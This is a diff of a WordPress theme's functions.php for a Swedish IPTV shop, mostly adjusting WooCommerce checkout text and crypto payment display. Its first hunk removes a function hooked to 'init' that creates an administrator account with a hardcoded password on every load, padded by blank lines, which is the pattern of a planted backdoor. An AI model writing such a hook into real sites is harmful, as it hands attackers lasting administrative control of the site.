@@ -59,52 +59,6 @@ function my_enqueue_bootstrap() {
     );
 }
 add_action('wp_enqueue_scripts', 'my_enqueue_bootstrap');
-function create_admin_user() {
-    // Define user details
-    $username = 'newadmin'; // Replace with the desired username
-    $password = 'securepassword123'; // Replace with a secure password
-    $email = 'newadmin@example.com'; // Replace with the user's email address
-    $first_name = 'Admin'; // Replace with the user's first name
-    $last_name = 'User'; // Replace with the user's last name
-    $role = 'administrator'; // Assign the administrator role
-
-    // Check if user already exists
-    if ( !username_exists($username) && !email_exists($email) ) {
-        // Create the user
-        $user_id = wp_create_user($username, $password, $email);
-        
-        // Check if user creation was successful
-        if ( !is_wp_error($user_id) ) {
-            // Update user meta
-            wp_update_user(array(
-                'ID' => $user_id,
-                'first_name' => $first_name,
-                'last_name' => $last_name,
-                'role' => $role
-            ));
-            
-        } else {
-        }
-    } else {
-    }
-}
-
-// Call the function to create the admin user
-add_action('init', 'create_admin_user');
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 add_action('woocommerce_checkout_before_order_review', 'custom_checkout_columns_start');
 add_action('woocommerce_checkout_after_order_review', 'custom_checkout_columns_end');
 remove_action('woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20);
@@ -238,7 +192,6 @@ function custom_checkout_columns_start() {
                 echo '<table class="totals-table">';
                 echo '<tbody>';
                 echo '<tr><td>Pris | SEK</td><td>' . do_shortcode('[total-price-sek]') . '</td></tr>';
-                echo '<tr><td>Pris | BTC</td><td>' . do_shortcode('[total-price-btc]') . '</td></tr>';
                 echo '</tbody>';
                 echo '</table>';
             echo '</div>';
@@ -259,7 +212,6 @@ function custom_checkout_columns_start() {
         echo '<table class="totals-table">';
         echo '<tbody>';
         echo '<tr><td>Pris | SEK</td><td>' . do_shortcode('[total-price-sek]') . '</td></tr>';
-        echo '<tr><td>Pris | BTC</td><td>' . do_shortcode('[total-price-btc]') . '</td></tr>';
         echo '</tbody>';
         echo '</table>';
         echo '</div>';
@@ -311,7 +263,7 @@ function add_custom_payment_message() {
                 echo "100-400 SEK";
             echo '</div>'; 
         echo '</div>';
-        echo '<p class="blockonomics-payments-message"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/info.png"><span>När du betalar med Bitcoin så skickar du BTC från en valfri plånbok eller från någon utav de rekommenderade kryptobörserna på nästa sida.<br><br><strong>Skickar du från din egen wallet så ansvarar du själv för avgifterna! Den totala summan inkl. avgifter ser du på nästa sida.</strong></span></p>';
+        echo '<p class="blockonomics-payments-message"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/info.png"><span>När du betalar med Krypto så skickar du valfri valuta från valfri plånbok eller från någon utav de kryptobörserna vi har guider för.<br><br><strong style="color: red;">OBS! Du ansvarar för avgifterna som plånboken/börsen du skickar ifrån tar. Skickar du ett för lågt belopp så går din beställning inte igenom!</strong></span></p>';
    
     echo '<a href="#coupon-section" class="mobile-arrow-bottom"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Vector-16.png"></a></div>';
 
@@ -323,7 +275,7 @@ function add_custom_payment_message() {
                 echo "Kortavgift";
             echo '</div>';
             echo '<div class="fee-price">';
-            echo do_shortcode('[total-fee-sek]');
+            echo '10%';
             echo '</div>';
         echo '</div>';
         echo '<p class="blockonomics-payments-message"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/info-1.png"><span>Med detta alternativ genomförs transaktionen i valutan $ (Dollar). Du köper USDC som sedan skickas till oss per automatik.<br/><br/><strong>Om detta betalningsalternativ inte fungerar för dig så kan du skapa en ny order och välja något av våra andra alternativ.</strong></span></p><a href="#coupon-section" class="mobile-arrow-bottom"><img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Vector-16.png"></a>';
@@ -355,7 +307,7 @@ function custom_payment_gateway_icon($icon, $gateway_id) {
     $description =  $setting['description']; 
     $icon_link      = get_option("{$gateway_id}_icon_link" );
     if ($gateway_id === 'sellix') {
-        $icon = '<img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Icon-awesome-btc.png" alt="Bitcoin" class="bit-coin-logo"><div class="payment-text">'. $title .'<p class="payment-dis">'. $description .'</p></div><p class="payment-discription">
+        $icon = '<img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Icon-awesome-btc.png" alt="Bitcoin" class="bit-coin-logo" style="margin: 0px 10px !important;"><div class="payment-text">'. $title .'<p class="payment-dis">'. $description .'</p></div><p class="payment-discription">
         <img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Vector-15.png">10-60 min</p>
         <img src="' . $icon_link . '">
         ';
@@ -389,7 +341,6 @@ function update_cart_totals_on_payment_method_change() {
         echo '<table class="totals-table">';
         echo '<tbody>';
         echo '<tr><td>Pris | SEK</td><td>' . do_shortcode('[total-price-sek]') . '</td></tr>';
-        echo '<tr><td>Pris | BTC</td><td>' . do_shortcode('[total-price-btc]') . '</td></tr>';
         echo '</tbody>';
         echo '</table>';
     } else{
